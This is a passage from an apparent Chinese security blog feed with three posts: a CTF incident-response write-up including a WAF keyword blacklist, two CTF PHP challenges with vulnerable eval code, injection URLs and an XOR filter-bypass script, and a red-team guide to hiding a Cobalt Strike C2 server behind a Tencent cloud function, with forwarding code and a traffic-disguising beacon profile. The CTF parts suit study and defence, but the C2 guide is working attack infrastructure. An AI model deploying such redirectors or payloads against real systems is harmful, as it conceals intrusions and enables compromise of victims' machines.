    <content type="html"><![CDATA[<p>上周末打了强网杯，某赛道打了第三名拿了二等奖，上午是运维赛，下午是awd。<br>上午的运维赛出的还可以，我觉得难度相对低一点，一共12道题，到最后基本有一半的人能做出来6-8道左右，本赛道第三-八名全部是8道题。这次拿奖得亏了有pwn👴去修题，我web应急响应做的不如别人多。</p><p>吐槽：下午的AWD纯脑瘫，参赛手册写的是AWDP，赛制介绍则是AWD。不一致也就算了，下午AWD只给一道巨难的pwn是什么意思？最后放hint连exp都快放完了，最后只有高校组有1-2支队伍在打，其他赛道全在罚坐。</p><h1 id="web运维"><a href="#web运维" class="headerlink" title="web运维"></a>web运维</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>有一个存在反序列化漏洞的页面，大体意思就是传入参数之后反序列化进行命令执行，题目本身给了waf，只不过关键词比较少。如 blacklist=’\php|flag|system|&#39;;自己加一些关键字就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|file_get_contents|fwrite|curl|system|eval|shell_exec|cat|tac|more|flag|base64|assert|passthru|readfile|php\:\/\/|file\:\/\/|fread|create\_function|php|script|\&lt;\?php|\&#x27;|\&quot;|\(|\)|\&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$back_list</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$query</span>))  <span class="comment">// 假设用户输入的参数是 $query</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hack detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多加了几个关键字这题的check就过了</p><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p> ls -all 看了一下有.2.php，我直接 rm -rf 删完之后这个check点还是没有过，之后又ll看了下发现是不死马。<br> 杀不死马有2种思路，第一种是写脚本无限循环删除，python或者shell或者php脚本都可以，第二种是重启php-fpm服务。这次给的权限比较高，是root，可以直接重启。但是在大部分awd比赛中可能没有重启服务的权限，所以第一种思路是必行的。<br> 附脚本<br> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rm -rf .3.php;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;remove success&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><br>上传上去之后chmod u+x 1.sh 然后 nohup ./1.sh &amp;挂着跑就可以了。</p><h2 id="phpinfo信息泄露"><a href="#phpinfo信息泄露" class="headerlink" title="phpinfo信息泄露"></a>phpinfo信息泄露</h2><p>没啥好说的，删了就行。</p><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>把源码搞下来放到D盾查杀，查到了后门，直接删掉就好，还有XXE，文件也是直接删掉就好。</p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h2><p>web就那么几道题我是妹想到的，我以为后面还会放题，专门问了主办方，主办方说一次放完，好吧，那估计是要在其他地方找patch点了。top看了一下，有一个进程的cpu利用率过高，在/home/ctf/mxxx目录下（具体目录名称记不清了）是一个elf文件，同目录下还有json的配置文件，直觉告诉我是挖矿。挖矿程序常在tmp目录写点东西，这里的操作就是首先干掉挖矿进程，然后删掉挖矿程序以及tmp目录下对应的内容，然后查看crontab防止再次下载与自启动。</p><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>crontab这题我应该是妹做出来，异常点是ctf用户的crontab，我是root用户。看了 /var/spool/cron/crontabs没看到啥东西,就没在看。赛后师傅说了下 crontab -user -l 也可以看指定用户的crontab。。学到了</p><h2 id="外连socket"><a href="#外连socket" class="headerlink" title="外连socket"></a>外连socket</h2><p>netstat -antlp 之后发现有向9999端口外连的行为，然后ps aux 和ps ef 之后看到了命令类似 sh -c python3 -c “__import__(‘os’).system(‘xxxxxx’)”。可以确定是这些进程建立了socket连接，但是找不到具体是谁起了这些进程…就很无奈，杀也杀不掉，这里我的处理方法是把python3的软连接给干掉了。因为通过观察进程发现除了这些外连的没有用py3起的进程。这里其实是有个so文件被修改了，后面pwn的队友修复的。</p><h2 id="ssh公钥"><a href="#ssh公钥" class="headerlink" title="ssh公钥"></a>ssh公钥</h2><p>ssh 免密登录存放的公钥在~/.ssh/authorized_keys文件里面，由于我们是私钥登录，但是里面有三个公钥，我们只保留了我们私钥对应的公钥，其他公钥全给删了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次运维赛相对基础，就当温习一下应急响应了。毕竟只正经做过一次：）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上周末打了强网杯，某赛道打了第三名拿了二等奖，上午是运维赛，下午是awd。&lt;br&gt;上午的运维赛出的还可以，我觉得难度相对低一点，一共12道题，到最后基本有一半的人能做出来6-8道左右，本赛道第三-八名全部是8道题。这次拿奖得亏了有pwn👴去修题，我web应急响应做的不如别</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>两道简单ctf-php-web题</title>
    <link href="https://polosec.github.io/2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/"/>
    <id>https://polosec.github.io/2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/</id>
    <published>2021-11-05T16:26:30.000Z</published>
    <updated>2021-11-05T16:32:23.106Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">String2Array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span> == <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">&quot;\$array = <span class="subst">$data</span>;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$attrid</span>) &amp;&amp; is_array(<span class="variable">$attrvalue</span>))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;array(&#x27;</span>;</span><br><span class="line">        <span class="variable">$attrids</span> = count(<span class="variable">$attrid</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$attrids</span>; <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$attrstr</span> .= <span class="string">&#x27;&quot;&#x27;</span>.intval(<span class="variable">$attrid</span>[<span class="variable">$i</span>]).<span class="string">&#x27;&quot;=&gt;&#x27;</span>.<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$attrvalue</span>[<span class="variable">$i</span>].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$i</span> &lt; <span class="variable">$attrids</span>-<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$attrstr</span> .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String2Array(<span class="variable">$attrstr</span>);</span><br><span class="line">​```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意点：extract可以进行变量覆盖，<span class="keyword">eval</span>那句话是把字符串数组格式转为真正的数组。</span><br><span class="line">exp:</span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=2%22);system(%27whoami%27);//&amp;attrid%5B0%5D=1">http://127.0.0.1/test.io/index.php?attrvalue[0]=2%22);system(%27whoami%27);//&amp;attrid[0]=1</a><br><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=1&amp;attrid%5B0%5D=2&amp;attrstr=phpinfo()">http://127.0.0.1/test.io/index.php?attrvalue[0]=1&amp;attrid[0]=2&amp;attrstr=phpinfo()</a>;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(&#39;0&#39;);</span><br><span class="line">$str1 &#x3D; $_GET[&#39;str1&#39;];</span><br><span class="line">$str2 &#x3D; $_GET[&#39;str2&#39;];</span><br><span class="line">function waf($str)</span><br><span class="line">&#123;</span><br><span class="line">$blacklist&#x3D;&#39;&#x2F;phpinfo|passthru&#x2F;i&#39;;</span><br><span class="line">    if (preg_match($blacklist,$str))</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return  true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function HackMe($str1,$str2)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; &quot;&quot;;</span><br><span class="line">for ($i &#x3D; 0;$i&lt;strlen($str1);$i++)</span><br><span class="line">&#123;</span><br><span class="line">$array1[$i] &#x3D; $str1[$i];</span><br><span class="line">&#125;</span><br><span class="line">for ($b &#x3D; 0;$b&lt;strlen($str2);$b++)</span><br><span class="line">&#123;</span><br><span class="line">$array2[$b] &#x3D; $str2[$b];</span><br><span class="line">&#125;</span><br><span class="line">for ($c&#x3D;0;$c &lt;count($array1);$c++)</span><br><span class="line">&#123;</span><br><span class="line">$str &#x3D; $str.($array1[$c] ^ $array2[$c]);</span><br><span class="line">&#125;</span><br><span class="line">if (strlen($str)&lt;&#x3D;30)</span><br><span class="line">&#123;</span><br><span class="line">if (waf($str))</span><br><span class="line">&#123;</span><br><span class="line">echo $str;</span><br><span class="line">eval($str);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;ohhhhhhhhhhhhhhhhhhhhhhhh you can&#39;t get flag!!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;nonono you are sooooooooo lang~&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HackMe($str1,$str2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目复现时没有waf.php，在比赛的时候需要去fuzz下过滤了哪个字符，所以我这里简单写了些waf的实现，直接写到function里面了。简单的异或，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ava_alpha=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">32</span>&lt;i <span class="keyword">and</span> i&lt;<span class="number">127</span>):</span><br><span class="line">        ava_alpha.append(<span class="built_in">chr</span>(i))</span><br><span class="line">target_str=<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span></span><br><span class="line">res1=<span class="string">&quot;&quot;</span></span><br><span class="line">res2=<span class="string">&quot;&quot;</span></span><br><span class="line">blacklist=[<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Getoutofloop</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(target_str)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ava_alpha:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> ava_alpha:</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))==(target_str[k]) <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> blacklist <span class="keyword">and</span> j <span class="keyword">not</span> <span class="keyword">in</span> blacklist):</span><br><span class="line">                    res1+=<span class="built_in">str</span>(i)</span><br><span class="line">                    res2+=<span class="built_in">str</span>(j)</span><br><span class="line">                    <span class="keyword">raise</span> Getoutofloop()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res1)</span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比较简单的异或，写脚本的时候注意如何跳出所有循环，这里用到了raise exception，可以根据黑名单维护blacklist保证不用blacklist里面的字符生成异或字符。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike 云函数隐藏服务器IP</title>
    <link href="https://polosec.github.io/2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/"/>
    <id>https://polosec.github.io/2021/10/15/CobaltStrike-%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8IP/</id>
    <published>2021-10-15T09:46:15.000Z</published>
    <updated>2021-10-15T11:14:32.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q">https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q</a></p><p><a href="https://blog.zsec.uk/cobalt-strike-profiles/">https://blog.zsec.uk/cobalt-strike-profiles/</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在红队基础设施建设中，使用云函数可隐藏真实C2的IP地址，当然，这只是其中一种方法，其他方法包括但不限于特征消除、证书修改、CDN、域前置。这些技术会陆续实现。</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>腾讯云注册云函数</p><p>新建函数-自定义创建函数</p><p><img src="http://cdn.polowong.top/image-20211015185512996.png" alt="image-20211015185512996"></p><p>Python模板，python3.6即可，触发方式选择API网关触发</p><p>在函数代码中写入如下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    C2=<span class="string">&#x27;http://&#x27;</span> <span class="comment"># C2 IP地址，这里可以使用 HTTP、HTTPS~下角标~</span></span><br><span class="line">    path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">    headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">        resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.headers)</span><br><span class="line">        <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line">    response=&#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>接下来配置API网关</p><p><img src="http://cdn.polowong.top/image-20211015185830062.png" alt="image-20211015185830062"></p><p>版本选择LATEST，点进去蓝色的链接进行API配置，路径改为根目录</p><p><img src="http://cdn.polowong.top/image-20211015185912831.png" alt="image-20211015185912831"></p><p><img src="http://cdn.polowong.top/image-20211015185921658.png" alt="image-20211015185921658"></p><p>然后下一步，事件函数，版本选择LATEST，一定要勾选响应集成。之后点立即完成就可以了。</p><p>发布服务之后在右边可以看到API的HTTP与HTTPS地址，记住这个有用，当然了，在云函数那也可以看（函数服务-触发管理-访问路径）</p><p><img src="http://cdn.polowong.top/image-20211015190133119.png" alt="image-20211015190133119"></p><h1 id="cobalt-strike配置"><a href="#cobalt-strike配置" class="headerlink" title="cobalt strike配置"></a>cobalt strike配置</h1><p>CS的配置踩大坑。</p><p>首先是编写对应的profile，代码如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">set</span> <span class="string">sample_name</span> <span class="string">&quot;t&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">sleeptime</span> <span class="string">&quot;3000&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">jitter</span>   <span class="string">&quot;0&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">maxdns</span>   <span class="string">&quot;255&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">useragent</span> <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line"><span class="string">http-get</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/x&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">metadata</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;SESSIONID=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Nodejs&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-stager</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x86</span> <span class="string">&quot;/vue.min.js&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x64</span> <span class="string">&quot;/bootstrap-2.min.js&quot;</span><span class="string">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-post</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/y&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">id</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;JSESSION=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写完之后命名为c2.profile，然后用cs目录下的c2lint.sh进行检查，这个东西的作用就是检查编写的profile是否正确。</p><p>c2lint.sh ./c2.profile</p><p><img src="http://cdn.polowong.top/image-20211015190808713.png" alt="image-20211015190808713"></p><p>这样看是没啥问题，然后运行teamserver的时候后面跟上profile就可以了，例如</p><p>./teamserver.sh 1.1.1.1 123456 c2.profile</p><p>这样就可以把profile作为listener的配置。</p><p>启动cs后，添加http listener，HOSTS和STAGER填写如下</p><p><img src="http://cdn.polowong.top/image-20211015191005476.png" alt="image-20211015191005476"></p><p>都是生成的云函数的地址，注意把前面的HTTP：//去掉！！</p><p>保存后，生成EXE，上线。</p><p>然后在victim主机上查看流量，并没有发现C2的IP地址,140开头的地址不是我的地址。</p><p><img src="http://cdn.polowong.top/image-20211015191107942.png" alt="image-20211015191107942"></p><p><img src="http://cdn.polowong.top/image-20211015191253179.png" alt="image-20211015191253179"></p><p>这样就使用云函数实现了C2真实IP的隐藏，在CS中也可以正常使用命令，证明beacon工作无异常。</p><p><img src="http://cdn.polowong.top/image-20211015191425103.png" alt="image-20211015191425103"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/VcP2O5usGHf7BBzCGQt_6Q&quot;&gt;ht</summary>
      
    
    
    
    
    <category term="红队技能" scheme="https://polosec.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>绿城杯AWD总结</title>
    <link href="https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/</id>
    <published>2021-10-14T17:07:20.000Z</published>
    <updated>2021-10-14T17:13:11.947Z</updated>
    
